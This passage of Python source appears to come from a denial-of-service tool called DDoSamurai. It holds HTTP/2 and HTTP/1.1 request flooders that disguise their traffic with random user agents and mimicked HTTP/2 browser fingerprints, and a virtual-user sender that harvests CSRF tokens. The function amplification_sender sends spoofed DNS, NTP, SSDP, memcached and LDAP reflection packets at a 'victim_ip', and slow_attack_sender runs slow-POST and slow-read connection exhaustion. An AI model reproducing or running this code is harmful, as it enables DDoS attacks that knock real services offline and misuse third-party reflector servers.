                    "h2_transport": transport_name,
                    "h2_connections": h2_conn_count,
                    "h2_streams_per_conn": h2_stream_cap,
                    "sender_path": "PY_HTTP2",
                },
                attempted_default=dispatch_count,
                sender_path="PY_HTTP2",
                engine_path_used="PY_HTTP2",
                fallback_reason=c_fallback_reason,
                route=route,
            )
        )

    if transport_name == "hyper-h2":
        if scheme_name != "https":
            log_error("HTTP/2 hyper-h2 transport only supports scheme=https.")
            _update_live(live_progress, dispatch_count)
            _update_live(live_errors, dispatch_count)
            return _stats(
                **_normalize_l7_output(
                    {
                        "attempted": dispatch_count,
                        "sent": 0,
                        "errors": dispatch_count,
                        "h2_profile_requested": int(profile_requested),
                        "h2_profile_applied": 0,
                        "h2_profile_disabled": profile_disabled,
                        "h2_profile_apply_failed": 0,
                        "h2_transport": "hyper-h2",
                        "h2_connections": h2_conn_count,
                        "h2_streams_per_conn": h2_stream_cap,
                        "sender_path": "PY_HTTP2",
                    },
                    attempted_default=dispatch_count,
                    sender_path="PY_HTTP2",
                    engine_path_used="PY_HTTP2",
                    fallback_reason=c_fallback_reason,
                    route=route,
                )
            )
        if (not bool(HYPER_H2_AVAILABLE)) or _h2_transport is None:
            log_error("HTTP/2 hyper-h2 transport requested but dependency is unavailable.")
            _update_live(live_progress, dispatch_count)
            _update_live(live_errors, dispatch_count)
            return _stats(
                **_normalize_l7_output(
                    {
                        "attempted": dispatch_count,
                        "sent": 0,
                        "errors": dispatch_count,
                        "h2_profile_requested": int(profile_requested),
                        "h2_profile_applied": 0,
                        "h2_profile_disabled": profile_disabled,
                        "h2_profile_apply_failed": 0,
                        "h2_transport": "hyper-h2",
                        "h2_connections": h2_conn_count,
                        "h2_streams_per_conn": h2_stream_cap,
                        "sender_path": "PY_HTTP2",
                    },
                    attempted_default=dispatch_count,
                    sender_path="PY_HTTP2",
                    engine_path_used="PY_HTTP2",
                    fallback_reason=c_fallback_reason,
                    route=route,
                )
            )

    # Hyper-h2 path: real transport-level profile application
    can_try_hyper_h2 = (
        transport_name in {"auto", "hyper-h2"}
        and (resolved_profile is not None or transport_name == "hyper-h2")
        and scheme_name == "https"
        and bool(HYPER_H2_AVAILABLE)
        and _h2_transport is not None
    )
    if can_try_hyper_h2:
        reqs = []
        for i in range(dispatch_count):
            if planned_items:
                item = planned_items[i]
                req_method = str(getattr(item, "method", http_method) or http_method)
                req_path = str(getattr(item, "path", "/") or "/")
                req_headers = dict(getattr(item, "headers", {}) or {})
                plan_ua = str(getattr(item, "user_agent", "") or "").strip()
                if user_agent:
                    req_headers["user-agent"] = str(user_agent)
                elif plan_ua:
                    req_headers["user-agent"] = plan_ua
                req_body = getattr(item, "body", None)
                req_content_type = str(getattr(item, "content_type", "") or "").strip()
                if req_body is not None and req_content_type and "content-type" not in {str(k).lower() for k in req_headers}:
                    req_headers["content-type"] = req_content_type
            else:
                req_method = str(http_method or "GET")
                req_path = str(random.choice(http_path) if isinstance(http_path, list) else http_path)
                req_headers = {}
                if user_agent:
                    req_headers["user-agent"] = str(user_agent)
                req_body = None
            reqs.append({"method": req_method, "path": req_path, "headers": req_headers, "body": req_body})

        try:
            h2_settings = dict(getattr(resolved_profile, "settings", {}) or {}) if resolved_profile is not None else {}
            h2_window_update = int(getattr(resolved_profile, "window_update", 0) or 0) if resolved_profile is not None else 0
            if h2_conn_count <= 1:
                h2_out = await _h2_transport.send_h2_requests(
                    host=str(target_ip),
                    port=int(target_port),
                    requests=reqs,
                    verify=verify_tls,
                    ssl_context=ssl_ctx_obj,
                    timeout_s=10.0,
                    settings=h2_settings,
                    window_update=h2_window_update,
                    max_inflight_streams=h2_stream_cap,
                )
                merged = dict(h2_out or {})
            else:
                groups = [[] for _ in range(h2_conn_count)]
                for idx, req in enumerate(reqs):
                    groups[idx % h2_conn_count].append(req)
                tasks = []
                for grp in groups:
                    if not grp:
                        continue
                    tasks.append(
                        asyncio.create_task(
                            _h2_transport.send_h2_requests(
                                host=str(target_ip),
                                port=int(target_port),
                                requests=grp,
                                verify=verify_tls,
                                ssl_context=ssl_ctx_obj,
                                timeout_s=10.0,
                                settings=h2_settings,
                                window_update=h2_window_update,
                                max_inflight_streams=h2_stream_cap,
                            )
                        )
                    )
                merged = {
                    "attempted": dispatch_count,
                    "sent": 0,
                    "errors": 0,
                    "responses_total": 0,
                    "status_2xx": 0,
                    "status_4xx": 0,
                    "status_5xx": 0,
                }
                if tasks:
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    for item in results:
                        if isinstance(item, Exception):
                            continue
                        merged["sent"] += int(item.get("sent", 0) or 0)
                        merged["responses_total"] += int(item.get("responses_total", 0) or 0)
                        merged["status_2xx"] += int(item.get("status_2xx", 0) or 0)
                        merged["status_4xx"] += int(item.get("status_4xx", 0) or 0)
                        merged["status_5xx"] += int(item.get("status_5xx", 0) or 0)
                merged["errors"] = max(0, dispatch_count - int(merged.get("sent", 0) or 0))

            sent_count = int(merged.get("sent", 0) or 0)
            err_count = int(merged.get("errors", max(0, dispatch_count - sent_count)) or 0)
            _update_live(live_progress, dispatch_count)
            _update_live(live_sent, sent_count)
            _update_live(live_errors, err_count)
            log_info(f"HTTP/2 (hyper-h2) finished sending {dispatch_count} requests.")
            return _stats(
                **_normalize_l7_output(
                    {
                        "attempted": dispatch_count,
                        "sent": sent_count,
                        "errors": max(err_count, dispatch_count - sent_count),
                        "responses_total": int(merged.get("responses_total", sent_count) or sent_count),
                        "status_2xx": int(merged.get("status_2xx", 0) or 0),
                        "status_4xx": int(merged.get("status_4xx", 0) or 0),
                        "status_5xx": int(merged.get("status_5xx", 0) or 0),
                        "h2_profile_requested": int(profile_requested),
                        "h2_profile_applied": int(bool(profile_requested and resolved_profile is not None)),
                        "h2_profile_disabled": profile_disabled,
                        "h2_profile_apply_failed": 0,
                        "h2_transport": "hyper-h2",
                        "h2_connections": h2_conn_count,
                        "h2_streams_per_conn": h2_stream_cap,
                        "sender_path": "PY_HTTP2",
                    },
                    attempted_default=dispatch_count,
                    sender_path="PY_HTTP2",
                    engine_path_used="PY_HTTP2",
                    fallback_reason=c_fallback_reason,
                    route=route,
                )
            )
        except Exception as exc:
            log_warning(f"HTTP/2 hyper-h2 transport failed: {exc}")
            if transport_name == "hyper-h2":
                _update_live(live_progress, dispatch_count)
                _update_live(live_errors, dispatch_count)
                return _stats(
                    **_normalize_l7_output(
                        {
                            "attempted": dispatch_count,
                            "sent": 0,
                            "errors": dispatch_count,
                            "h2_profile_requested": int(profile_requested),
                            "h2_profile_applied": 0,
                            "h2_profile_disabled": profile_disabled,
                            "h2_profile_apply_failed": int(bool(profile_requested and resolved_profile is not None)),
                            "h2_transport": "hyper-h2",
                            "h2_connections": h2_conn_count,
                            "h2_streams_per_conn": h2_stream_cap,
                            "sender_path": "PY_HTTP2",
                        },
                        attempted_default=dispatch_count,
                        sender_path="PY_HTTP2",
                        engine_path_used="PY_HTTP2",
                        fallback_reason=c_fallback_reason,
                        route=route,
                    )
                )

    ok = 0
    err = 0
    responses = 0
    status_2xx = 0
    status_4xx = 0
    status_5xx = 0
    h2_cfg = None

    async def _flush(tasks):
        nonlocal ok, err, responses, status_2xx, status_4xx, status_5xx
        if not tasks:
            return
        res = await asyncio.gather(*tasks, return_exceptions=True)
        tasks.clear()
        
        batch_sent = 0
        batch_err = 0
        for r in res:
            if isinstance(r, Exception):
                err += 1
                batch_err += 1
            else:
                ok += 1
                batch_sent += 1
                responses += 1
                code = int(getattr(r, "status_code", 0) or 0)
                if 200 <= code < 300:
                    status_2xx += 1
                elif 400 <= code < 500:
                    status_4xx += 1
                elif code >= 500:
                    status_5xx += 1
        
        _update_live(live_sent, batch_sent)
        _update_live(live_errors, batch_err)

    headers = {}
    if user_agent:
        headers["User-Agent"] = user_agent
    
    try:
        limits = httpx.Limits(max_keepalive_connections=h2_conn_count, max_connections=h2_conn_count)
        async with httpx.AsyncClient(
            http2=True,
            base_url=base_url,
            limits=limits,
            cookies=cookies,
            headers=headers,
            verify=ssl_ctx_obj if ssl_ctx_obj is not None else verify_tls,
        ) as client:
            h2_cfg = h2_mimic.apply_h2_profile(client, h2_profile_name)
            if h2_cfg.applied:
                log_info(f"HTTP/2 profile applied: {h2_cfg.resolved}")
            else:
                log_warning(f"HTTP/2 profile not applied: requested={h2_cfg.requested} resolved={h2_cfg.resolved} reason={h2_cfg.reason}")

            tasks = []
            for i in range(dispatch_count):
                _update_live(live_progress, 1)
                if planned_items:
                    item = planned_items[i]
                    req_method = str(getattr(item, "method", http_method) or http_method)
                    req_path = str(getattr(item, "path", "/") or "/")
                    per_req_headers = dict(getattr(item, "headers", {}) or {})
                    if user_agent:
                        per_req_headers["User-Agent"] = str(user_agent)
                    else:
                        plan_ua = str(getattr(item, "user_agent", "") or "").strip()
                        if plan_ua:
                            per_req_headers["User-Agent"] = plan_ua
                    req_body = getattr(item, "body", None)
                    req_content_type = str(getattr(item, "content_type", "") or "").strip()
                    if req_body is not None and req_content_type:
                        existing_keys = {str(k).lower() for k in per_req_headers.keys()}
                        if "content-type" not in existing_keys:
                            per_req_headers["Content-Type"] = req_content_type
                    tasks.append(
                        asyncio.create_task(
                            client.request(
                                req_method,
                                req_path,
                                headers=per_req_headers or None,
                                content=req_body,
                            )
                        )
                    )
                else:
                    path = random.choice(http_path) if isinstance(http_path, list) else http_path
                    tasks.append(asyncio.create_task(client.request(http_method, path)))
                
                # If we reached concurrency limit, wait for some to finish or just yield
                if len(tasks) >= max_dispatch_concurrency:
                    await _flush(tasks)
            
            # Finish remaining tasks
            if tasks:
                await _flush(tasks)
                
    except (httpx.ReadError, httpx.RemoteProtocolError, httpx.ConnectError) as e:
        log_error(f"HTTP/2 bağlantı hatası: Hedef sunucu HTTP/2'yi desteklemiyor veya bağlantıyı kesti. ({e})")
        err += max(1, dispatch_count - ok)
    except Exception as e:
        log_error(f"HTTP/2 sender failed: {e}\n{traceback.format_exc()}")
        err += max(1, dispatch_count - ok)
    finally:
        log_info(f"HTTP/2 sender finished sending {dispatch_count} requests.")
    return _stats(
        **_normalize_l7_output(
            {
                "attempted": dispatch_count,
                "sent": ok,
                "errors": max(err, dispatch_count - ok),
                "responses_total": responses,
                "status_2xx": status_2xx,
                "status_4xx": status_4xx,
                "status_5xx": status_5xx,
                "h2_profile_requested": bool(h2_cfg and h2_cfg.requested and h2_cfg.requested != "none"),
                "h2_profile_applied": bool(h2_cfg and h2_cfg.applied),
                "h2_profile_disabled": bool(h2_cfg and h2_cfg.reason == "profile_disabled"),
                "h2_profile_apply_failed": bool(h2_cfg and (not h2_cfg.applied) and h2_cfg.reason != "profile_disabled"),
                "h2_transport": "httpx",
                "h2_connections": h2_conn_count,
                "h2_streams_per_conn": h2_stream_cap,
                "sender_path": "PY_HTTP2",
            },
            attempted_default=dispatch_count,
            sender_path="PY_HTTP2",
            engine_path_used="PY_HTTP2",
            fallback_reason=c_fallback_reason,
            route=route,
        )
    )

async def http_app_sender(
    target_ip, target_port, count, concurrency, http_method, http_path, payloads, verbose,
    scheme="http", verify=True, timeout_s=5.0, retries=0, ssl_context=None,
    cookies=None, user_agent=None,
    live_sent=None, live_errors=None, live_progress=None
):
    """
    Sends standard HTTP/1.1 requests using httpx.
    """
    if not HTTPX_AVAILABLE:
        log_error("HTTP sender için 'httpx' kütüphanesi yüklü değil.")
        return _stats(attempted=count, sent=0, errors=count)

    base_url = f"{scheme}://{target_ip}:{target_port}"
    log_info(f"HTTP sender initialized. Target: {base_url}, Count: {count}")

    headers = {}
    if user_agent:
        headers["User-Agent"] = user_agent
    else:
        headers["User-Agent"] = random.choice(utils.USER_AGENTS) if hasattr(utils, 'USER_AGENTS') else "DDoSamurai/2.0"

    ok = 0
    err = 0
    responses = 0
    status_2xx = 0
    status_4xx = 0
    status_5xx = 0

    async def _flush(tasks):
        nonlocal ok, err, responses, status_2xx, status_4xx, status_5xx
        if not tasks:
            return
        res = await asyncio.gather(*tasks, return_exceptions=True)
        tasks.clear()
        
        batch_sent = 0
        batch_err = 0
        for r in res:
            if isinstance(r, Exception):
                err += 1
                batch_err += 1
                continue
            ok += 1
            batch_sent += 1
            responses += 1
            code = int(getattr(r, "status_code", 0) or 0)
            if 200 <= code < 300:
                status_2xx += 1
            elif 400 <= code < 500:
                status_4xx += 1
            elif code >= 500:
                status_5xx += 1
        
        _update_live(live_sent, batch_sent)
        _update_live(live_errors, batch_err)

    retry_attempt_total = 0
    retry_success_count = 0
    max_retries = max(0, int(retries))

    async def _request_with_retry(client, method, path, data):
        """Execute a single request with exponential backoff retry."""
        nonlocal retry_attempt_total, retry_success_count
        last_exc = None
        for attempt in range(1 + max_retries):
            try:
                resp = await client.request(method, path, content=data)
                if attempt > 0:
                    retry_success_count += 1
                return resp
            except (httpx.ConnectError, httpx.ReadTimeout, httpx.WriteTimeout,
                    httpx.ConnectTimeout, httpx.PoolTimeout) as exc:
                last_exc = exc
                if attempt < max_retries:
                    retry_attempt_total += 1
                    backoff = min(0.5 * (2 ** attempt), 5.0)
                    await asyncio.sleep(backoff)
        raise last_exc

    try:
        limits = httpx.Limits(max_keepalive_connections=concurrency, max_connections=concurrency)
        async with httpx.AsyncClient(verify=ssl_context if ssl_context else verify, base_url=base_url, limits=limits, cookies=cookies, headers=headers, timeout=timeout_s) as client:
            tasks = []
            for i in range(count):
                _update_live(live_progress, 1)
                path = random.choice(http_path) if isinstance(http_path, list) else http_path
                data = random.choice(payloads) if payloads else None
                
                tasks.append(asyncio.create_task(_request_with_retry(client, http_method, path, data)))
                
                if len(tasks) >= concurrency:
                    await _flush(tasks)
            
            if tasks:
                await _flush(tasks)

    except Exception as e:
        log_error(f"HTTP sender failed: {e}")
        err += max(0, count - ok)
    finally:
        log_info(f"HTTP sender finished sending {count} requests. retries_total={retry_attempt_total} retry_recovered={retry_success_count}")
    return _stats(
        attempted=count,
        sent=ok,
        errors=max(err, count - ok),
        responses_total=responses,
        status_2xx=status_2xx,
        status_4xx=status_4xx,
        status_5xx=status_5xx,
        retry_attempt_total=retry_attempt_total,
        retry_success_count=retry_success_count,
    )

async def http_stateful_sender(
    target_ip, target_port, vu_count, concurrency,
    workflow_steps, verbose,
    scheme="http", verify=False, timeout_s=10.0,
    user_agent=None, ssl_context=None,
    retries=0,
    http_method="GET",
    http_path="/",
    payloads=None,
    session_repeats=1,
    max_active_sessions=None,
    session_keepalive=True,
    l7_engine="python",
    legacy_path_enable=False,
    lab_profile="off",
    l7_fallback_policy="allow",
    l7_capability_strict=False,
    request_plan: "H2RequestPlan | None" = None,
    live_sent=None, live_errors=None, live_progress=None,
):
    """
    Stateful HTTP sender using VirtualUser engine.
    Each VU has its own cookie jar, token cache, and redirect history.

    Args:
        vu_count: Number of virtual users to simulate.
        concurrency: Max parallel VUs.
        workflow_steps: list of virtual_user.WorkflowStep objects.
    """
    base_url = f"{scheme}://{target_ip}:{target_port}"
    vu_count = max(0, int(vu_count or 0))
    if vu_count <= 0:
        return _stats(attempted=0, sent=0, errors=0)
    planned_items = list(getattr(request_plan, "items", []) or []) if request_plan is not None else []
    planned_paths = [str(getattr(item, "path", "") or "").strip() for item in planned_items]
    planned_paths = [p for p in planned_paths if p]
    planned_methods = [str(getattr(item, "method", "") or "").strip().upper() for item in planned_items]
    planned_methods = [m for m in planned_methods if m]
    planned_uas = [str(getattr(item, "user_agent", "") or "").strip() for item in planned_items]
    planned_uas = [ua for ua in planned_uas if ua]
    planned_headers = [dict(getattr(item, "headers", {}) or {}) for item in planned_items]
    planned_bodies = [getattr(item, "body", None) for item in planned_items]
    planned_content_types = [str(getattr(item, "content_type", "") or "").strip() for item in planned_items]

    if not user_agent and planned_uas:
        user_agent = planned_uas[0]

    route = l7_dispatch.build_route_decision(
        L7RouteRequest(
            protocol="http1",
            l7_engine=str(l7_engine or "python"),
            protocol_engine="auto",
            fallback_policy=str(l7_fallback_policy or "allow"),
            capability_strict=bool(l7_capability_strict),
            legacy_path_enable=bool(legacy_path_enable),
            lab_profile=str(lab_profile or "off"),
        )
    )
    c_fallback_reason = "none"
    if route.engine == "c_state":
        _http_path_first = str(planned_paths[0]) if planned_paths else (
            str(http_path[0]) if isinstance(http_path, list) and len(http_path) > 0 else str(http_path or "/")
        )
        _http_method_first = str(planned_methods[0]) if planned_methods else str(http_method or "GET")
        cfg = l7_c_adapter.make_config(
            target_ip=str(target_ip),
            target_port=int(target_port or 0),
            count=int(vu_count),
            concurrency=int(concurrency or 1),
            session_repeats=int(session_repeats or 1),
            max_active_sessions=int(max_active_sessions or 0),
            mode="http1_stateful",
            extra={
                "scheme": str(scheme or "http"),
                "verify": bool(verify),
                "timeout_s": float(timeout_s or 10.0),
                "lab_profile": str(lab_profile or "off"),
                "retries": int(retries or 0),
                "http_method": _http_method_first,
                "http_path": _http_path_first,
                "l7_request_plan_count": int(len(planned_items)),
            },
        )
        c_res = await l7_c_adapter.run("http1", cfg)
        if l7_legacy.should_return_c_result(c_res, allow_python_fallback=route.allow_python_fallback):
            c_stats = l7_telemetry.normalize_l7_stats(
                c_res.as_stats(),
                attempted_default=vu_count,
                sender_path="C_STATE_HTTP1",
                engine_path_used=route.l7_engine_path_used,
                fallback_reason=str(getattr(c_res, "sender_fallback_reason", "none") or "none"),
            )
            c_stats.update(route.as_stats())
            _update_live(live_progress, int(c_stats.get("attempted", vu_count) or 0))
            _update_live(live_sent, int(c_stats.get("sent", 0) or 0))
            _update_live(live_errors, int(c_stats.get("errors", 0) or 0))
            return _stats(**c_stats)
        c_fallback_reason = str(getattr(c_res, "sender_fallback_reason", "none") or "none")
        log_warning(
            "L7 c_state HTTP engine unavailable/failed; "
            f"Python VirtualUser path fallback enabled (reason={c_fallback_reason})."
        )

    from .virtual_user import run_vu_pool, WorkflowStep, ExtractRule

    max_vus = max(1, int(os.environ.get("SAMURAI_L7_MAX_VUS", "20000") or 20000))
    if vu_count > max_vus:
        log_warning(f"Stateful HTTP VU count capped: {vu_count} -> {max_vus}")
        vu_count = max_vus

    max_retries = max(0, int(retries or 0))
    session_repeats = max(1, int(session_repeats or 1))
    if max_active_sessions is None:
        max_active_sessions = int(os.environ.get("SAMURAI_L7_MAX_ACTIVE_SESSIONS", "0") or 0)
    max_active_sessions = int(max_active_sessions or 0)
    if max_active_sessions > 0:
        concurrency = min(int(concurrency or 1), max_active_sessions)
    concurrency = max(1, int(concurrency or 1))
    steps_provider = None

    def _build_default_workflow(
        *,
        path_list: list[str],
        method_name: str,
        body_payload,
        action_headers: dict[str, str] | None = None,
    ):
        step0 = str(path_list[0])
        step1 = str(path_list[1] if len(path_list) > 1 else path_list[0])
        step2 = str(path_list[2] if len(path_list) > 2 else path_list[-1])
        action_headers = dict(action_headers or {})
        common_headers = {}
        if "accept" in action_headers:
            common_headers["Accept"] = str(action_headers["accept"])
        if "accept-language" in action_headers:
            common_headers["Accept-Language"] = str(action_headers["accept-language"])
        return [
            WorkflowStep(
                name="bootstrap",
                method="GET",
                path=step0,
                expected_status=(200, 399),
                follow_redirects=True,
                extract=[
                    ExtractRule(field_name="X-CSRF-Token", source="header", header_name="X-CSRF-Token"),
                    ExtractRule(
                        field_name="csrf_token",
                        source="body_regex",
                        regex_pattern=r'name=["\']csrf(?:_token)?["\']\s+value=["\']([^"\']+)["\']',
                    ),
                    ExtractRule(field_name="sessionid", source="cookie", cookie_name="sessionid"),
                ],
                timeout_s=float(timeout_s),
                max_retries=max_retries,
                headers=common_headers,
            ),
            WorkflowStep(
                name="prefetch",
                method="GET",
                path=step1,
                expected_status=(200, 399),
                follow_redirects=True,
                timeout_s=float(timeout_s),
                max_retries=max_retries,
                headers=common_headers,
            ),
            WorkflowStep(
                name="action",
                method=method_name,
                path=step2,
                body=body_payload,
                expected_status=(200, 499),
                follow_redirects=True,
                inject_tokens=["X-CSRF-Token", "X-CSRF-Token:csrf_token"],
                timeout_s=float(timeout_s),
                max_retries=max_retries,
                headers=action_headers,
            ),
        ]

    if not workflow_steps:
        default_paths = list(planned_paths) if planned_paths else (
            list(http_path) if isinstance(http_path, list) else [http_path]
        )
        default_paths = [str(p) for p in default_paths if str(p).strip()] or ["/"]
        default_method = str(planned_methods[0] if planned_methods else (http_method or "GET")).upper()
        default_body = None
        if planned_bodies and planned_bodies[0] is not None:
            default_body = planned_bodies[0]
        elif isinstance(payloads, list) and payloads:
            default_body = random.choice(payloads)
        default_headers = dict(planned_headers[0] if planned_headers else {})
        if default_body is not None and planned_content_types and planned_content_types[0]:
            default_headers.setdefault("Content-Type", planned_content_types[0])
        workflow_steps = _build_default_workflow(
            path_list=default_paths,
            method_name=default_method,
            body_payload=default_body,
            action_headers=default_headers,
        )
        if planned_items:
            def _item_for_session(uid: int, rep_idx: int):
                idx = (int(uid) * int(session_repeats) + int(rep_idx)) % max(1, len(planned_items))
                return planned_items[idx]

            def _steps_provider(uid: int, rep_idx: int):
                plan_item = _item_for_session(uid, rep_idx)
                item_method = str(getattr(plan_item, "method", default_method) or default_method).upper()
                item_path = str(getattr(plan_item, "path", default_paths[0]) or default_paths[0])
                item_headers = dict(getattr(plan_item, "headers", {}) or {})
                item_body = getattr(plan_item, "body", None)
                item_content_type = str(getattr(plan_item, "content_type", "") or "").strip()
                if item_body is not None and item_content_type:
                    item_headers.setdefault("Content-Type", item_content_type)
                if not user_agent:
                    plan_ua = str(getattr(plan_item, "user_agent", "") or "").strip()
                    if plan_ua:
                        item_headers.setdefault("User-Agent", plan_ua)
                return _build_default_workflow(
                    path_list=[item_path, item_path, item_path],
                    method_name=item_method,
                    body_payload=item_body,
                    action_headers=item_headers,
                )

            steps_provider = _steps_provider

    step_count = len(workflow_steps)
    log_info(f"Stateful HTTP sender: {vu_count} VUs × {step_count} steps → {base_url}")

    run_started = time.monotonic()
    results, metrics = await run_vu_pool(
        vu_count=vu_count,
        base_url=base_url,
        steps=workflow_steps,
        steps_provider=steps_provider,
        concurrency=concurrency,
        verify=ssl_context if ssl_context else verify,
        timeout_s=timeout_s,
        user_agent=user_agent,
        session_repeats=session_repeats,
        max_active_sessions=max_active_sessions if max_active_sessions > 0 else None,
        session_keepalive=bool(session_keepalive),
    )
    run_duration_s = max(0.0, time.monotonic() - run_started)

    total_steps = sum(r.steps_ok + r.steps_failed for r in results)
    total_ok = sum(r.steps_ok for r in results)
    total_err = sum(r.steps_failed for r in results)
    retries_used = sum(int(getattr(r, "retries_used", 0) or 0) for r in results)
    handshake_samples_ms = [
        float(getattr(r, "first_step_latency_ms", 0.0) or 0.0)
        for r in results
        if float(getattr(r, "first_step_latency_ms", 0.0) or 0.0) > 0.0
    ]
    if handshake_samples_ms:
        l7_handshake_p99_ms = float(np.percentile(np.asarray(handshake_samples_ms, dtype=np.float64), 99))
    else:
        l7_handshake_p99_ms = 0.0
    l7_conn_total = int(metrics.workflows_completed) + int(metrics.workflows_failed)
    l7_conn_rate = float(l7_conn_total) / float(max(1e-9, run_duration_s))
    l7_step_fail_ratio = float(total_err) / float(max(1, total_steps))

    _update_live(live_sent, total_ok)
    _update_live(live_errors, total_err)
    _update_live(live_progress, total_steps)

    log_info(f"Stateful HTTP finished. VUs={vu_count} ok={metrics.workflows_completed} "
             f"fail={metrics.workflows_failed} session_success={metrics.session_success_rate:.2%}")

    py_stats = l7_telemetry.normalize_l7_stats(
        {
            "attempted": total_steps,
            "sent": total_ok,
            "errors": total_err,
            "retries_used": retries_used,
            "l7_active_sessions_peak": int(getattr(metrics, "active_sessions_peak", 0) or 0),
            "l7_conn_rate": float(l7_conn_rate),
            "l7_handshake_p99_ms": float(l7_handshake_p99_ms),
            "l7_step_fail_ratio": float(l7_step_fail_ratio),
            "sender_path": "PY_HTTP1_STATEFUL",
            "l7_engine_path_used": "PY_HTTP1",
            "l7_fallback_reason": c_fallback_reason,
            "l7_request_plan_used": int(bool(planned_items)),
            "l7_request_plan_items": int(len(planned_items)),
            **metrics.as_dict(),
        },
        attempted_default=total_steps,
        sender_path="PY_HTTP1_STATEFUL",
        engine_path_used="PY_HTTP1",
        fallback_reason=c_fallback_reason,
    )
    py_stats.update(route.as_stats())
    py_stats["l7_engine_path_used"] = "PY_HTTP1"
    return _stats(**py_stats)


async def amplification_sender(victim_ip, count, rps, reflector_file, amp_type, verbose, live_sent=None, live_errors=None, live_progress=None):
    """
    Sends amplification attack packets to a list of reflectors.
    """
    try:
        with open(reflector_file, 'r') as f:
            reflectors = [line.strip() for line in f if line.strip()]
    except Exception as e:
        log_error(f"Yansıtıcı dosyası okunamadı: {e}")
        return _stats(attempted=count, sent=0, errors=count)

    if not reflectors:
        log_error("Yansıtıcı listesi boş.")
        return _stats(attempted=count, sent=0, errors=count)

    log_info(f"{amp_type.upper()} Amplification saldırısı başlatılıyor. Hedef: {victim_ip}")

    loop = asyncio.get_running_loop()
    tasks = []
    
    if amp_type == 'dns-amp':
        packet_creator = lambda reflector: packet_utils.create_dns_amp_packet(reflector, victim_ip)
    elif amp_type == 'ntp-amp':
        packet_creator = lambda reflector: packet_utils.create_ntp_amp_packet(reflector, victim_ip)
    elif amp_type == 'ssdp-amp':
        packet_creator = lambda reflector: packet_utils.create_ssdp_amp_packet(reflector, victim_ip)
    elif amp_type == 'memcached-amp':
        packet_creator = lambda reflector: packet_utils.create_memcached_amp_packet(reflector, victim_ip)
    elif amp_type == 'ldap-amp':
        packet_creator = lambda reflector: packet_utils.create_ldap_amp_packet(reflector, victim_ip)
    else:
        log_error(f"Bilinmeyen amplifikasyon türü: {amp_type}")
        return _stats(attempted=count, sent=0, errors=count)

    async def _flush():
        if not tasks: return 0
        res = await asyncio.gather(*tasks, return_exceptions=True)
        tasks.clear()
        ok_count = 0
        err_count = 0
        for r in res:
            if r is True: ok_count += 1
            else: err_count += 1
        _update_live(live_sent, ok_count)
        _update_live(live_errors, err_count)
        return ok_count

    sent_ok = 0
    for i in range(count):
        _update_live(live_progress, 1)
        reflector = random.choice(reflectors)
        pkt = packet_creator(reflector)
        tasks.append(loop.create_task(send_packet_async(pkt, verbose, i + 1, loop, "udp")))
        
        if len(tasks) >= 256:
            sent_ok += await _flush()
        
        if rps > 0:
            await asyncio.sleep(1 / rps)
            
    if tasks:
        sent_ok += await _flush()

    log_info(f"{amp_type.upper()} Amplification saldırısı tamamlandı.")
    return _stats(attempted=count, sent=sent_ok, errors=max(0, count - sent_ok))

async def slow_attack_sender(target_ip, target_port, count, concurrency, attack_type, verbose, ssl_context=None, live_sent=None, live_errors=None, live_progress=None):
    """
    Performs Slow Rate attacks (Slow POST / Slow Read).
    """
    log_info(f"{attack_type.upper()} attack initialized. Target: {target_ip}:{target_port}, Concurrency: {concurrency}")
    
    loop = asyncio.get_running_loop()
    tasks = []
    sem = asyncio.Semaphore(concurrency)
    completed = 0
    errors = 0

    async def _slow_post_worker(worker_id):
        nonlocal completed, errors
        async with sem:
            _update_live(live_progress, 1)
            try:
                reader, writer = await asyncio.open_connection(target_ip, target_port, ssl=ssl_context)
                headers = (
                    f"POST / HTTP/1.1\r\n"
                    f"Host: {target_ip}\r\n"
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n"
                    f"Content-Length: 1000000\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                )
                writer.write(headers.encode())
                await writer.drain()
                for _ in range(100):
                    if writer.is_closing(): break
                    writer.write(b"A")
                    await writer.drain()
                    await asyncio.sleep(random.uniform(5, 15))
                writer.close()
                await writer.wait_closed()
                completed += 1
                _update_live(live_sent, 1)
            except Exception:
                errors += 1
                _update_live(live_errors, 1)

    async def _slow_read_worker(worker_id):
        nonlocal completed, errors
        async with sem:
            _update_live(live_progress, 1)
            try:
                reader, writer = await asyncio.open_connection(target_ip, target_port, ssl=ssl_context)
                request = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {target_ip}\r\n"
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                )
                writer.write(request.encode())
                await writer.drain()
                while True:
                    chunk = await reader.read(1)
                    if not chunk: break
                    await asyncio.sleep(random.uniform(2, 5))
                writer.close()
                await writer.wait_closed()
                completed += 1
                _update_live(live_sent, 1)
            except Exception:
                errors += 1
                _update_live(live_errors, 1)

    worker_func = _slow_post_worker if attack_type == 'slow-post' else _slow_read_worker
    tasks = [asyncio.create_task(worker_func(i)) for i in range(count)]
    await asyncio.gather(*tasks)
    log_info(f"{attack_type.upper()} attack finished.")
    return _stats(attempted=count, sent=completed, errors=max(errors, count - completed))

async def websocket_scenario_sender(
    target_ip,
    target_port,
    count,
    concurrency,
    ws_path,
    verbose,
    auth_message="",
    subscribe_messages=None,
    ping_message="ping",
    ping_count=1,
    await_response=False,
    l7_engine="python",
    legacy_path_enable=False,
    lab_profile="off",
    l7_fallback_policy="allow",
    l7_capability_strict=False,
    request_plan: "H2RequestPlan | None" = None,
    ssl_context=None,
    live_sent=None,
    live_errors=None,
    live_progress=None,
):
    """
    Stateful WebSocket scenario runner:
      connect -> auth -> subscribe -> ping/pong (optional recv on each step)
    `count` denotes number of WS sessions/scenario runs.
    """
    route = l7_dispatch.build_route_decision(
        L7RouteRequest(
            protocol="ws",
            l7_engine=str(l7_engine or "python"),
            protocol_engine="auto",
            fallback_policy=str(l7_fallback_policy or "allow"),
            capability_strict=bool(l7_capability_strict),
            legacy_path_enable=bool(legacy_path_enable),
            lab_profile=str(lab_profile or "off"),
        )
    )
    planned_items = list(getattr(request_plan, "items", []) or []) if request_plan is not None else []
    planned_paths = [str(getattr(item, "path", "") or "").strip() for item in planned_items]
    planned_paths = [p for p in planned_paths if p]
    planned_auth_msgs = [str(getattr(item, "ws_auth_message", "") or "").strip() for item in planned_items]
